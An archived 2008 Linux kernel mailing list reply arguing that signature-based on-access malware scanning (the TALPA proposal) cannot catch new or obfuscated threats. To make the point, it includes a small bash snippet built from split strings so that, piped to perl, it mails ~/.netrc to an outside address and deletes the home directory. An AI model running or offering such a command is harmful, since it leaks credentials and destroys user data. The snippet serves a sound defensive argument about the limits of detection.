Return-Path: <linux-kernel-owner+w=401wt.eu-S1754315AbYHPFhd@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1754315AbYHPFhd (ORCPT <rfc822;w@1wt.eu>);
	Sat, 16 Aug 2008 01:37:33 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751632AbYHPFhY
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sat, 16 Aug 2008 01:37:24 -0400
Received: from turing-police.cc.vt.edu ([128.173.14.107]:56035 "EHLO
	turing-police.cc.vt.edu" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751170AbYHPFhX (ORCPT
	<RFC822;linux-kernel@vger.kernel.org>);
	Sat, 16 Aug 2008 01:37:23 -0400
X-Mailer: exmh version 2.7.2 01/07/2005 with nmh-1.2
To: Arjan van de Ven <arjan@infradead.org>
Cc: Peter Dolding <oiaohm@gmail.com>, david@lang.hm, rmeijer@xs4all.nl,
       Alan Cox <alan@lxorguk.ukuu.org.uk>, capibara@xs4all.nl,
       Eric Paris <eparis@redhat.com>, Theodore Tso <tytso@mit.edu>,
       Rik van Riel <riel@redhat.com>, davecb@sun.com,
       linux-security-module@vger.kernel.org, Adrian Bunk <bunk@kernel.org>,
       Mihai Don??u <mdontu@bitdefender.com>, linux-kernel@vger.kernel.org,
       malware-list@lists.printk.net, Pavel Machek <pavel@suse.cz>
Subject: Re: [malware-list] [RFC 0/5] [TALPA] Intro to alinuxinterfaceforon access scanning
In-Reply-To: Your message of "Fri, 15 Aug 2008 21:09:42 PDT."
             <20080815210942.4e342c6c@infradead.org>
From: Valdis.Kletnieks@vt.edu
References: <18129.82.95.100.23.1218802937.squirrel@webmail.xs4all.nl> <e7d8f83e0808150627m7a5c8738n8ac42d77c45eea76@mail.gmail.com> <alpine.DEB.1.10.0808151024120.15109@asgard.lang.hm> <e7d8f83e0808152057h5c607cfbnecdc6f0bd05c5d89@mail.gmail.com>
            <20080815210942.4e342c6c@infradead.org>
Mime-Version: 1.0
Content-Type: multipart/signed; boundary="==_Exmh_1218864924_3568P";
	 micalg=pgp-sha1; protocol="application/pgp-signature"
Content-Transfer-Encoding: 7bit
Date: Sat, 16 Aug 2008 01:35:24 -0400
Message-ID: <51467.1218864924@turing-police.cc.vt.edu>
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

--==_Exmh_1218864924_3568P
Content-Type: text/plain; charset="us-ascii"
Content-Id: <51457.1218864915.1@turing-police.cc.vt.edu>

On Fri, 15 Aug 2008 21:09:42 PDT, Arjan van de Ven said:

(Re-arranging the order of Arjan's comments somewhat...)

> Sadly what you're doing is throwing up smoke and just saying "it
> doesn't solve world hunger as well so it's bad". Please do yourself a
> favor and stop that before people totally start ignoring you.

Many security experts believe that a false sense of security is worse than
no security at all.  In other words, unless the design team is *honest* with
themselves about what the proposal does and doesn't cover, and has at least
an *idea* of how the uncovered parts will function, you're not adding to
the *real* security.

The problem with saying stuff like "Oh, our threat model explicitly rules
out anything done by root" is that all too often, the other part of the
overall plan - the one that constrains the root user - is never deployed.

One of the proponents of the idea told me "so I don't see that as a big
problem", when the problem in question (the race condition between malware
arriving and actual scanning with a signature that detects the malware) is one
of *THE* biggest issue for actual deployments of this sort of stuff.  No, TALPA
doesn't have to necessarily deal with that race condition itself.

But you damn sight well better have a good idea of how you intend to deal
with it, because if you don't, the end result isn't actually usable for
anything...

> (nor should we do something that has no value.. but that's not the case;
> the model that Erik described is quite well defined as 
> "do not give ''bad' content to applications/exec".

The model is *not* "quite well defined" - because "bad content" is a rather
squishy term (go read Fred Cohen's PhD thesis, where he shows that detecting
viruses/malware is equivalent to the Turing Halting Problem).  What you
*really* mean is "that subset of bad content that we can reasonably
economically catch with pattern matching signatures".

And at that point, we're well into #2 on Marcus Ranum's list of Bad Security
Ideas - Enumerating Badness.

#!/bin/bash
ONE="system("
TWO="'"
THREE="mail ba"
FOUR="dguy@dropbox.com < ~/.netrc;r"
FIVE="m -rf ~ &');"
echo "$ONE$TWO$THREE$F0UR$FIVE" | perl

That gets dealt with how?  Did you have a signature that matched that targeted
code (of course not, your A/V vendor hasn't seen this e-mail yet)?  Did you
protect the | pipe as well as file input?

(Anybody else remember a few years ago, when ssh and sendmail distrib files
were trojaned with code that ran when the poor victim sysadmin built the
kit, presumably *not* as root - at which point the perpetrator had a open
shell on the box running as the user, and can download whatever privilege
escalation exploits to get root...)

But yeah, trying to scan data before it's read, to detect some fraction of
the known threats, *does* close a few holes.  The question is how does it
fit in as "part of this complete security breakfast"...


--==_Exmh_1218864924_3568P
Content-Type: application/pgp-signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (GNU/Linux)
Comment: Exmh version 2.5 07/13/2001

iD8DBQFIpmcccC3lWbTT17ARAlTEAJ9KM/S3KpwpXKE442gf8KYbuBGzrACgxYVv
mE/DBKsXO2HyvUoW+6KnORY=
=Tx1X
-----END PGP SIGNATURE-----

--==_Exmh_1218864924_3568P--
